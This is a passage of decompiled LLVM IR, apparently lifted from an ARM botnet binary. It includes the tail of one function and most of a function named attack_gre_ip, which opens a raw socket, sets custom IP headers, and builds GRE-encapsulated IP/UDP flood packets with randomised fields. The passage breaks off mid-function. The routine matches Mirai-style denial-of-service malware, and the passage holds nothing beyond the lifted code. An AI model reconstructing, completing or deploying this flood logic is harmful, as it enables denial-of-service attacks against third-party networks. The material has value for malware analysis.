  %v1_ad20 = phi i32 [ %v3_a7dc, %entry ], [ %v1_ad28, %dec_label_pc_ad24 ], [ %v2_ad08, %dec_label_pc_ad04 ]
  store i32 %v3_a66c, i32* %r4.global-to-local, align 4
  store i32 %v24_a66c, i32* %fp.global-to-local, align 4
  store i32 %v27_a66c, i32* %lr.global-to-local, align 4
  ret i32 %v1_ad20

dec_label_pc_ad24:                                ; preds = %dec_label_pc_a7ec
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v1_ad28 = call i32 @__GI___libc_close(i32 %v3_a7dc)
  store i32 %v1_ad28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad18

; uselistorder directives
  uselistorder i32 %v1_ad28, { 1, 0 }
  uselistorder i16 %v1_acbc, { 1, 0 }
  uselistorder i32 %v0_acbc, { 1, 0 }
  uselistorder i32 %v0_aca8, { 1, 0 }
  uselistorder i32 %v1_aca0, { 1, 0 }
  uselistorder i32 %v3_ac88, { 1, 0 }
  uselistorder i32 %v0_ac80, { 1, 0 }
  uselistorder i32 %v5_ac54, { 1, 0 }
  uselistorder i32 %v3_ac04, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_abec, { 2, 1, 0, 3 }
  uselistorder i32 %v1_abc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_ab74, { 1, 0, 2 }
  uselistorder i32 %v4_ab70, { 1, 0 }
  uselistorder i32 %v2_ab50, { 1, 0 }
  uselistorder i1 %v2_acc4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_ac74, { 1, 0, 2, 3 }
  uselistorder i1 %v7_aa7c, { 2, 1, 0 }
  uselistorder i32 %v0_a9fc, { 1, 0, 2 }
  uselistorder i32 %v0_a914, { 1, 2, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v1_a868, { 2, 0, 1 }
  uselistorder i32 %v3_a860, { 2, 1, 0 }
  uselistorder i1 %v2_a838, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a82c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_a828, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_a824, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_a820, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a81c, { 1, 0 }
  uselistorder i1 %v7_a80c, { 1, 0 }
  uselistorder i1 %v7_a7e0, { 1, 0 }
  uselistorder i32 %v3_a7dc, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_a7c8, { 2, 1, 0 }
  uselistorder i32 %v5_a7b8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_a784, { 1, 2, 0 }
  uselistorder i32 %v5_a764, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v6_a730, { 1, 0, 3, 2 }
  uselistorder i32 %v1_a718, { 1, 0 }
  uselistorder i32 %v1_a6f4, { 2, 1, 0 }
  uselistorder i32 %v5_a6ec, { 1, 0 }
  uselistorder i8 %v5_a6d0, { 0, 2, 1 }
  uselistorder i32 %v6_a6b0, { 1, 0 }
  uselistorder i32 %v2_a698, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 19, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 30, 27, 28, 29, 33, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 6, 5, 4, 1, 0, 3, 2, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_ad18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aac4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ad34 = load i32, i32* @r4, align 4
  %v24_ad34 = load i32, i32* @fp, align 4
  %v27_ad34 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_ad60 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ad64 = load i32, i32* @r4, align 4
  store i32 %v0_ad64, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ad70 = load i32, i32* @sb, align 4
  store i32 %v0_ad70, i32* %r3.global-to-local, align 4
  %v0_ad74 = load i32, i32* @r5, align 4
  %v5_ad78 = inttoptr i32 %v0_ad64 to i32*
  %v6_ad78 = call i32 @attack_get_opt_int(i32 %v0_ad74, i32* %v5_ad78, i32 2, i32 %v0_ad70)
  %v1_ad84 = urem i32 %v6_ad78, 256
  store i32 %v1_ad84, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ad90 = load i32, i32* @r4, align 4
  store i32 %v0_ad90, i32* %r1.global-to-local, align 4
  %v0_ad94 = load i32, i32* @r5, align 4
  %v5_ad98 = trunc i32 %v6_ad78 to i8
  %v6_ad9c = inttoptr i32 %v0_ad90 to i32*
  %v7_ad9c = call i32 @attack_get_opt_int(i32 %v0_ad94, i32* %v6_ad9c, i32 3, i32 65535)
  %v0_ada0 = load i32, i32* @r4, align 4
  store i32 %v0_ada0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_adb0 = load i32, i32* @r5, align 4
  %v5_adb4 = inttoptr i32 %v0_ada0 to i32*
  %v6_adb4 = call i32 @attack_get_opt_int(i32 %v0_adb0, i32* %v5_adb4, i32 4, i32 64)
  %v1_adbc = urem i32 %v6_adb4, 256
  store i32 %v1_adbc, i32* %ip.global-to-local, align 4
  %v0_adc0 = load i32, i32* @r4, align 4
  store i32 %v0_adc0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  %v6_add4 = inttoptr i32 %v0_adc0 to i32*
  %v7_add4 = call i32 @attack_get_opt_int(i32 %v0_adcc, i32* %v6_add4, i32 5, i32 1)
  %v1_ade0 = urem i32 %v7_add4, 256
  store i32 %v1_ade0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_adec = load i32, i32* @r4, align 4
  store i32 %v0_adec, i32* %r1.global-to-local, align 4
  %v0_adf0 = load i32, i32* @r5, align 4
  %v5_adf8 = inttoptr i32 %v0_adec to i32*
  %v6_adf8 = call i32 @attack_get_opt_int(i32 %v0_adf0, i32* %v5_adf8, i32 6, i32 65535)
  %v0_ae00 = load i32, i32* @r4, align 4
  store i32 %v0_ae00, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_adf8, i32* %fp.global-to-local, align 4
  %v0_ae10 = load i32, i32* @r5, align 4
  %v4_ae14 = inttoptr i32 %v0_ae00 to i32*
  %v5_ae14 = call i32 @attack_get_opt_int(i32 %v0_ae10, i32* %v4_ae14, i32 7, i32 65535)
  %v0_ae18 = load i32, i32* @r4, align 4
  store i32 %v0_ae18, i32* %r1.global-to-local, align 4
  %v0_ae1c = load i32, i32* @sb, align 4
  store i32 %v0_ae1c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_ae14, i32* @r8, align 4
  %v0_ae28 = load i32, i32* @r5, align 4
  %v4_ae2c = inttoptr i32 %v0_ae18 to i32*
  %v5_ae2c = call i32 @attack_get_opt_int(i32 %v0_ae28, i32* %v4_ae2c, i32 %v0_ae1c, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ae3c = load i32, i32* @r4, align 4
  store i32 %v0_ae3c, i32* %r1.global-to-local, align 4
  %v0_ae40 = load i32, i32* @r5, align 4
  %v4_ae44 = inttoptr i32 %v0_ae3c to i32*
  %v5_ae44 = call i32 @attack_get_opt_int(i32 %v0_ae40, i32* %v4_ae44, i32 1, i32 1)
  %v1_ae4c = urem i32 %v5_ae44, 256
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v0_ae50 = load i32, i32* @r4, align 4
  store i32 %v0_ae50, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_ae58 = load i32, i32* @sb, align 4
  store i32 %v0_ae58, i32* %r3.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v5_ae64 = inttoptr i32 %v0_ae50 to i32*
  %v6_ae64 = call i32 @attack_get_opt_int(i32 %v0_ae5c, i32* %v5_ae64, i32 18, i32 %v0_ae58)
  %v0_ae6c = load i32, i32* @r4, align 4
  store i32 %v0_ae6c, i32* %r1.global-to-local, align 4
  %v2_ae70 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_ae70, i32* %r3.global-to-local, align 4
  store i32 %v6_ae64, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_ae7c = load i32, i32* @r5, align 4
  %v4_ae80 = inttoptr i32 %v0_ae6c to i32*
  %v5_ae80 = call i32 @attack_get_opt_int(i32 %v0_ae7c, i32* %v4_ae80, i32 24, i32 %v2_ae70)
  %v0_ae88 = load i32, i32* @sb, align 4
  %v1_ae8c = inttoptr i32 %v0_ae88 to i32*
  %v2_ae8c = call i32 @__GI_time(i32* %v1_ae8c)
  %v1_ae90 = load i32, i32* @r6, align 4
  %v2_ae90 = add i32 %v1_ae90, %v2_ae8c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_aea4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_aea8 = icmp eq i32 %v3_aea4, -1
  store i1 %v7_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aea8, label %dec_label_pc_b378, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aebc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aebc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_aec4 = load i32, i32* @sb, align 4
  store i32 %v0_aec4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aed0 = call i32 @__GI_setsockopt(i32 %v3_aea4, i32 %v0_aec4, i32 3, i32 %v6_aebc, i32 4)
  %v7_aed4 = icmp eq i32 %v5_aed0, -1
  store i1 %v7_aed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aed4, label %dec_label_pc_b384, label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aeb4
  %v0_aedc = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_aef0 = load i32, i32* @r8, align 4
  %v3_aef4 = mul i32 %v7_ad9c, 65536
  store i32 %v3_aef4, i32* %r1.global-to-local, align 4
  %v0_aef8 = load i32, i32* @r7, align 4
  %v1_aef8 = urem i32 %v0_aef8, 256
  store i32 %v1_aef8, i32* @r7, align 4
  %v3_aefc = urem i32 %v0_aedc, 65536
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v3_af00 = urem i32 %v0_aef0, 65536
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v2_af04 = icmp eq i32 %arg2, 0
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  %v0_af14 = load i32, i32* @sb, align 4
  store i32 %v0_af14, i32* %stack_var_-44, align 4
  %v3_af18 = urem i32 %v7_ad9c, 65536
  store i32 %v3_af18, i32* @fp, align 4
  br i1 %v2_af04, label %dec_label_pc_b10c.preheader, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_aedc
  %v3_aef0 = mul i32 %v0_aef0, 65536
  %v3_aedc = mul i32 %v0_aedc, 65536
  %v3_af2c = mul i32 %v5_ae2c, 65536
  %v1_af30 = add i32 %v3_af2c, 3407872
  %tmp68 = udiv i32 %v1_af30, 256
  %v3_af3c = and i32 %tmp68, 65280
  %v7_ad9c.not = or i32 %v7_ad9c, -65536
  %v1_af40 = xor i32 %v7_ad9c.not, 65535
  %v4_af44 = udiv i32 %v1_af30, 16777216
  %v5_af44 = or i32 %v3_af3c, %v4_af44
  store i32 %v3_aef4, i32* %r3.global-to-local, align 4
  %tmp69 = mul i32 %v7_ad9c, 256
  %v3_af5c = and i32 %tmp69, 65280
  %tmp70 = mul nsw i32 %v1_af40, 256
  %v3_af60 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v7_ad9c, 256
  %v4_af64 = urem i32 %tmp71, 256
  %v5_af64 = or i32 %v4_af64, %v3_af5c
  %tmp72 = udiv i32 %v1_af40, 256
  %v4_af6c = urem i32 %tmp72, 256
  %v5_af6c = or i32 %v4_af6c, %v3_af60
  store i32 %v5_af6c, i32* @r6, align 4
  store i32 %v3_aedc, i32* %r1.global-to-local, align 4
  store i32 %v3_aef0, i32* %r2.global-to-local, align 4
  %v1_af80 = add i32 %v3_af2c, 524288
  %tmp73 = mul i32 %v0_aedc, 256
  %v3_af84 = and i32 %tmp73, 65280
  %v1_af88 = add i32 %v3_af2c, 1835008
  store i32 %v1_af88, i32* @r5, align 4
  %tmp74 = mul i32 %v0_aef0, 256
  %v3_af8c = and i32 %tmp74, 65280
  %v3_af94 = udiv i32 %v1_af88, 256
  %tmp75 = udiv i32 %v0_aedc, 256
  %v4_af98 = urem i32 %tmp75, 256
  %v5_af98 = or i32 %v4_af98, %v3_af84
  %tmp76 = udiv i32 %v0_aef0, 256
  %v4_af9c = urem i32 %tmp76, 256
  %v5_af9c = or i32 %v4_af9c, %v3_af8c
  store i32 %v5_af9c, i32* %ip.global-to-local, align 4
  %v1_afa0 = and i32 %v3_af94, 65280
  %tmp77 = udiv i32 %v1_af80, 256
  %v3_afa4 = and i32 %tmp77, 65280
  store i32 %v3_afa4, i32* @lr, align 4
  %v4_afb8 = udiv i32 %v1_af80, 16777216
  %v5_afb8 = or i32 %v3_afa4, %v4_afb8
  store i32 %v5_afb8, i32* @r7, align 4
  %v4_afbc = udiv i32 %v1_af88, 16777216
  %v5_afbc = or i32 %v1_afa0, %v4_afbc
  store i32 %v5_afbc, i32* @r8, align 4
  store i32 %v0_af14, i32* @r4, align 4
  %v4_b014 = sext i8 %v5_ad98 to i32
  %v1_b020 = trunc i32 %v6_adb4 to i8
  %sext = mul nuw i32 %v5_af44, 65536
  %v4_b028 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_af64, 65536
  %v4_b02c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_af6c, 65536
  %v4_b094 = sdiv i32 %sext9, 65536
  %v2_b0c4 = icmp eq i32 %v1_aef8, 0
  %sext10 = mul nuw i32 %v5_af98, 65536
  %v4_b0e8 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_af9c, 65536
  %v4_b0f0 = sdiv i32 %sext11, 65536
  %extract.t = trunc i32 %v4_b028 to i16
  br label %dec_label_pc_afc4

dec_label_pc_afc4:                                ; preds = %bb82, %dec_label_pc_af28
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_afd0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_ad60, i32* %ip.global-to-local, align 4
  %v2_afdc = load i32, i32* @r4, align 4
  %v5_afdc = mul i32 %v2_afdc, 4
  %v6_afdc = add i32 %v5_afdc, %v2_ad60
  %v7_afdc = inttoptr i32 %v6_afdc to i32*
  store i32 %v2_afd0, i32* %v7_afdc, align 4
  %v3_afe0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afe0, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* %ip.global-to-local, align 4
  %v4_afe4 = mul i32 %v3_afe0, 4
  %v5_afe4 = add i32 %v0_afe4, %v4_afe4
  %v6_afe4 = inttoptr i32 %v5_afe4 to i32*
  %v7_afe4 = load i32, i32* %v6_afe4, align 4
  store i32 %v7_afe4, i32* %r4.global-to-local, align 4
  %v1_afe8 = inttoptr i32 %v7_afe4 to i8*
  %v2_afe8 = load i8, i8* %v1_afe8, align 1
  %tmp = urem i8 %v2_afe8, 16
  %v1_afec = zext i8 %tmp to i32
  %v1_aff0 = or i32 %v1_afec, 64
  store i32 %v1_aff0, i32* %r2.global-to-local, align 4
  %v1_aff4 = trunc i32 %v1_aff0 to i8
  store i8 %v1_aff4, i8* %v1_afe8, align 1
  %v0_aff8 = load i32, i32* %r3.global-to-local, align 4
  %v5_affc = mul i32 %v0_aff8, 24
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v0_b000 = load i32, i32* %r4.global-to-local, align 4
  %v1_b000 = inttoptr i32 %v0_b000 to i8*
  %v2_b000 = load i8, i8* %v1_b000, align 1
  %v1_b004 = and i8 %v2_b000, -16
  %v1_b008 = or i8 %v1_b004, 5
  store i32 %v1_ade0, i32* %lr.global-to-local, align 4
  store i8 %v1_b008, i8* %v1_b000, align 1
  store i32 %v4_b014, i32* %r2.global-to-local, align 4
  %v2_b018 = load i32, i32* %r4.global-to-local, align 4
  %v3_b018 = add i32 %v2_b018, 1
  %v4_b018 = inttoptr i32 %v3_b018 to i8*
  store i8 %v5_ad98, i8* %v4_b018, align 1
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v2_b020 = load i32, i32* %r4.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 8
  %v4_b020 = inttoptr i32 %v3_b020 to i8*
  store i8 %v1_b020, i8* %v4_b020, align 1
  %v0_b024 = load i32, i32* %lr.global-to-local, align 4
  %v2_b024 = icmp eq i32 %v0_b024, 0
  store i1 %v2_b024, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b028, i32* %ip.global-to-local, align 4
  store i32 %v4_b02c, i32* %lr.global-to-local, align 4
  br i1 %v2_b024, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_afc4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b034 = load i32, i32* %r4.global-to-local, align 4
  %v4_b034 = add i32 %v3_b034, 6
  %v5_b034 = inttoptr i32 %v4_b034 to i16*
  store i16 64, i16* %v5_b034, align 2
  %v0_b038.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_b038.pre to i16
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_afc4, %bb
  %v0_b038.off0 = phi i16 [ %extract.t, %dec_label_pc_afc4 ], [ %extract.t27, %bb ]
  %v2_b038 = load i32, i32* %r4.global-to-local, align 4
  %v3_b038 = add i32 %v2_b038, 2
  %v4_b038 = inttoptr i32 %v3_b038 to i16*
  store i16 %v0_b038.off0, i16* %v4_b038, align 2
  %v0_b03c = load i32, i32* %r4.global-to-local, align 4
  %v1_b03c = add i32 %v0_b03c, 20
  store i32 %v1_b03c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_b048 = add i32 %v0_b03c, 9
  %v4_b048 = inttoptr i32 %v3_b048 to i8*
  store i8 47, i8* %v4_b048, align 1
  %v0_b04c = load i32, i32* %lr.global-to-local, align 4
  %v1_b04c = trunc i32 %v0_b04c to i16
  %v2_b04c = load i32, i32* %r4.global-to-local, align 4
  %v3_b04c = add i32 %v2_b04c, 4
  %v4_b04c = inttoptr i32 %v3_b04c to i16*
  store i16 %v1_b04c, i16* %v4_b04c, align 2
  %v0_b050 = load i32, i32* %ip.global-to-local, align 4
  %v1_b050 = trunc i32 %v0_b050 to i16
  %v2_b050 = load i32, i32* %r2.global-to-local, align 4
  %v3_b050 = add i32 %v2_b050, 2
  %v4_b050 = inttoptr i32 %v3_b050 to i16*
  store i16 %v1_b050, i16* %v4_b050, align 2
  store i32 %v5_ae80, i32* %lr.global-to-local, align 4
  %v0_b058 = load i32, i32* %r4.global-to-local, align 4
  %v1_b058 = add i32 %v0_b058, 24
  %v2_b058 = inttoptr i32 %v1_b058 to i8*
  %v3_b058 = load i8, i8* %v2_b058, align 1
  %v4_b058 = zext i8 %v3_b058 to i32
  store i32 %v4_b058, i32* %r2.global-to-local, align 4
  %v2_b05c = add i32 %v0_b058, 12
  %v3_b05c = inttoptr i32 %v2_b05c to i32*
  store i32 %v5_ae80, i32* %v3_b05c, align 4
  %v0_b060 = load i32, i32* %r2.global-to-local, align 4
  %v1_b060 = and i32 %v0_b060, -241
  %v1_b064 = or i32 %v1_b060, 64
  store i32 %v1_b064, i32* %r2.global-to-local, align 4
  %v0_b068 = load i32, i32* %r1.global-to-local, align 4
  %v1_b068 = load i32, i32* @sl, align 4
  %v2_b068 = add i32 %v1_b068, %v0_b068
  store i32 %v2_b068, i32* %r1.global-to-local, align 4
  %v1_b06c = add i32 %v2_b068, 16
  %v2_b06c = inttoptr i32 %v1_b06c to i32*
  %v3_b06c = load i32, i32* %v2_b06c, align 4
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v1_b070 = trunc i32 %v1_b064 to i8
  %v2_b070 = load i32, i32* %r4.global-to-local, align 4
  %v3_b070 = add i32 %v2_b070, 24
  %v4_b070 = inttoptr i32 %v3_b070 to i8*
  store i8 %v1_b070, i8* %v4_b070, align 1
  %v0_b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_b074 = add i32 %v0_b074, 24
  %v2_b074 = inttoptr i32 %v1_b074 to i8*
  %v3_b074 = load i8, i8* %v2_b074, align 1
  %v1_b078 = and i8 %v3_b074, -16
  %v1_b07c = or i8 %v1_b078, 5
  store i8 %v1_b07c, i8* %v2_b074, align 1
  %v0_b084 = load i32, i32* %r1.global-to-local, align 4
  %v1_b084 = load i32, i32* %r4.global-to-local, align 4
  %v2_b084 = add i32 %v1_b084, 16
  %v3_b084 = inttoptr i32 %v2_b084 to i32*
  store i32 %v0_b084, i32* %v3_b084, align 4
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  %v0_b08c = load i32, i32* %r4.global-to-local, align 4
  %v1_b08c = add i32 %v0_b08c, 24
  store i32 %v1_b08c, i32* @r5, align 4
  %v3_b090 = add i32 %v0_b08c, 25
  %v4_b090 = inttoptr i32 %v3_b090 to i8*
  store i8 %v5_ad98, i8* %v4_b090, align 1
  store i32 %v4_b094, i32* %r2.global-to-local, align 4
  %v0_b098 = load i32, i32* @r8, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r5, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  %v0_b09c = load i32, i32* %r2.global-to-local, align 4
  %v1_b09c = trunc i32 %v0_b09c to i16
  %v2_b09c = load i32, i32* @r5, align 4
  %v3_b09c = add i32 %v2_b09c, 4
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0a4, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 64, i32* %ip.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v2_b0a8 = load i32, i32* @r5, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 8
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b020, i8* %v4_b0a8, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b0b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0b0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_b0b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_b0b0 = trunc i32 %v1_b0b0 to i16
  %v3_b0b0 = load i32, i32* @r5, align 4
  %v4_b0b0 = add i32 %v3_b0b0, 6
  %v5_b0b0 = inttoptr i32 %v4_b0b0 to i16*
  store i16 %v2_b0b0, i16* %v5_b0b0, align 2
  %v0_b0b4.pre = load i32, i32* %r3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_b0b4.pre to i8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_b0b4.off0 = phi i8 [ 17, %bb79 ], [ %extract.t28, %bb80 ]
  %v2_b0b4 = load i32, i32* @r5, align 4
  %v3_b0b4 = add i32 %v2_b0b4, 9
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i8*
  store i8 %v0_b0b4.off0, i8* %v4_b0b4, align 1
  %v0_b0b8 = call i32 @rand_next()
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b0c4, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c8 = sub i32 1023, %v0_b0b8
  store i32 %v1_b0c8, i32* %r3.global-to-local, align 4
  br i1 %v2_b0c4, label %.thread12, label %.thread13

.thread12:                                        ; preds = %bb81
  %v2_b0d0 = load i32, i32* @r5, align 4
  %v3_b0d0 = add i32 %v2_b0d0, 16
  %v4_b0d0 = inttoptr i32 %v3_b0d0 to i32*
  store i32 %v1_b0c8, i32* %v4_b0d0, align 4
  br label %bb82

.thread13:                                        ; preds = %bb81
  %v1_b0cc = load i32, i32* %r4.global-to-local, align 4
  %v2_b0cc = add i32 %v1_b0cc, 16
  %v3_b0cc = inttoptr i32 %v2_b0cc to i32*
  %v4_b0cc = load i32, i32* %v3_b0cc, align 4
  store i32 %v4_b0cc, i32* %r3.global-to-local, align 4
  %v2_b0d4 = load i32, i32* @r5, align 4
  %v3_b0d4 = add i32 %v2_b0d4, 16
  %v4_b0d4 = inttoptr i32 %v3_b0d4 to i32*
  store i32 %v4_b0cc, i32* %v4_b0d4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread12, %.thread13
  %v1_b0d8 = load i32, i32* @r5, align 4
  %v2_b0d8 = add i32 %v1_b0d8, 12
  %v3_b0d8 = inttoptr i32 %v2_b0d8 to i32*
  store i32 %v0_b0b8, i32* %v3_b0d8, align 4
  %v3_b0dc = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_b0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b0e4 = add i32 %v0_b0e4, 44
  store i32 %v1_b0e4, i32* @r6, align 4
  store i32 %v4_b0e8, i32* %r2.global-to-local, align 4
  %v1_b0ec = add i32 %v3_b0dc, 1
  store i32 %v1_b0ec, i32* @r4, align 4
  store i32 %v4_b0f0, i32* %r3.global-to-local, align 4
  %v9_b0f4 = icmp eq i32 %v1_b0ec, %arg2
  store i1 %v9_b0f4, i1* %cpsr_z.global-to-local, align 1
  %v0_b0f8 = load i32, i32* @r7, align 4
  %v1_b0f8 = trunc i32 %v0_b0f8 to i16
  %v3_b0f8 = add i32 %v0_b0e4, 48
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i16*
  store i16 %v1_b0f8, i16* %v4_b0f8, align 2
  %v0_b0fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r6, align 4
  %v3_b0fc = inttoptr i32 %v2_b0fc to i16*
  store i16 %v1_b0fc, i16* %v3_b0fc, align 2
  %v0_b100 = load i32, i32* %r3.global-to-local, align 4
